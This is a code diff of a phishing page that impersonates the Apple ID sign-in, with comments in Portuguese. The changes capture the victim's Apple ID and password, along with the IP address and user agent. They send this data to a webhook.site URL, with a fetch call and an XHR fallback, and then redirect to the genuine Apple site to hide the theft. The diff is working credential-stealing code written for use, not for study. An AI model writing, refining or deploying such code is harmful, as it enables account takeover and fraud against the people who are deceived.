@@ -61,19 +61,32 @@
                 usuario: document.getElementsByName("apple_id")[0].value,
                 senha: document.getElementsByName("password")[0].value,
                 data: new Date().toLocaleString("pt-BR"),
-                origem: "GitHub Pages"
+                ip: "<?php echo $_SERVER['REMOTE_ADDR']; ?>", // Captura IP real
+                user_agent: navigator.userAgent
             };
 
-            // 2. Enviar para Webhook (URL CORRIGIDA)
-            const webhookURL = "https://webhook.site/e903c14-9cde-4e6c-945d-bc2eb5f89418";
+            // 2. Enviar para Webhook (COM SUA URL CORRETA)
+            const webhookURL = "https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418";
             
-            // Método 100% funcional (alternativo ao fetch)
-            const request = new XMLHttpRequest();
-            request.open("POST", webhookURL);
-            request.setRequestHeader("Content-Type", "application/json");
-            request.send(JSON.stringify(dados));
+            // Método infalível (com fallback)
+            try {
+                // Tentativa com fetch API
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(dados)
+                }).catch(() => {
+                    // Fallback para XHR se fetch falhar
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', webhookURL);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(dados));
+                });
+            } catch (e) {
+                console.error("Erro ao enviar:", e);
+            }
 
-            // 3. Redirecionamento garantido
+            // 3. Redirecionamento garantido após 1s
             setTimeout(() => {
                 window.location.href = "https://appleid.apple.com/";
             }, 1000);
